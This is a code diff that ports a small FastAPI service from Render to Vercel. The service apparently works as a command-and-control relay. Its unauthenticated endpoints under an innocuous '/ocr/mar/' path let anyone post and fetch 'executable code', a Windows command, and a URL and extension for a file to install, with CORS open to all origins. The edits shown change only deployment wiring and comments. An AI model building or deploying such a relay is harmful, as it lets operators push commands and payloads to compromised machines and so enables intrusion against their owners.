@@ -1,50 +1,50 @@
-import os # Only if you actually use os-specific functions, otherwise remove
+import os
 from fastapi import FastAPI, Query, Body
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
+from mangum import Mangum # Import Mangum
 
-# Pydantic model for request body (conventionally PascalCase)
+# Pydantic model
 class Script(BaseModel):
     code: str
 
 # --- Global State Variables ---
-# IMPORTANT: These are in-memory and will be RESET if your Render service restarts
-# (e.g., due to a new deployment, scaling, or platform maintenance).
-# For persistent storage, consider using a database (Render offers free PostgreSQL)
-# or a key-value store like Redis.
-
+# WARNING: ON VERCEL, THESE WILL NOT PERSIST RELIABLY BETWEEN REQUESTS.
+# Vercel functions are stateless. You MUST use an external database for persistence.
+# This code will "run" but the data in these globals will be highly unpredictable.
 url_file_data = {
     "url_file": None,
     "extention": None
 }
 code_exe_data = None
-
 dec_data = {
     "option": None,
 }
-
 command_data = {
     "windows": None,
 }
 # --- End Global State Variables ---
 
-app = FastAPI()
+app = FastAPI() # Create your FastAPI app instance
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],  # For production, restrict this to your frontend's domain
+    allow_origins=["*"],
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
 @app.get("/ocr/mar/evente")
 def get_evente_status():
+    # This will return the initial state or whatever was set by a previous call
+    # IF that previous call was handled by the exact same warm function instance.
+    # Do not rely on this for persistence.
     return dec_data
 
 @app.put("/ocr/mar/evente_updat")
 def update_evente_status(mise: str = Query(...)):
     global dec_data
-    dec_data["option"] = mise
+    dec_data["option"] = mise # This change is only for the current function instance
     return dec_data
 
 @app.get("/ocr/mar/command")
@@ -59,16 +59,15 @@ def update_command_details(new_command: str = Query(...)):
 
 @app.get("/ocr/mar/code")
 def get_executable_code():
-    return {"code": code_exe_data} # Return as a JSON object for consistency
+    return {"code": code_exe_data}
 
 @app.put("/ocr/mar/code/updat")
 def update_executable_code(new_code_payload: Script = Body(...)):
     global code_exe_data
     try:
         code_exe_data = str(new_code_payload.code)
-        return {"status": "success", "message": "Code updated successfully.", "updated_code": code_exe_data}
+        return {"status": "success", "message": "Code updated successfully (in this instance).", "updated_code": code_exe_data}
     except Exception as e:
-        # In a real app, log the error `e`
         return {"status": "error", "message": f"Failed to update code: {str(e)}"}
 
 @app.get("/ocr/mar/install_file")
@@ -82,10 +81,9 @@ def update_install_file_info(url: str = Query(...), extension: str = Query(...))
     url_file_data["extention"] = extension
     return url_file_data
 
-# This line can be helpful for some deployment environments,
-# though with `uvicorn main:app`, `app` is directly referenced.
-# It doesn't hurt to have it.
-application = app
+# Vercel handler: Mangum wraps the FastAPI app
+# The 'handler' variable is what Vercel will look for by default in Python serverless functions.
+handler = Mangum(app)
 
-# To run locally (for development):
-# uvicorn main:app --reload --port 8000
+# Note: The `uvicorn main:app --host 0.0.0.0 --port 8000` command is for traditional servers,
+# not for Vercel serverless deployment.
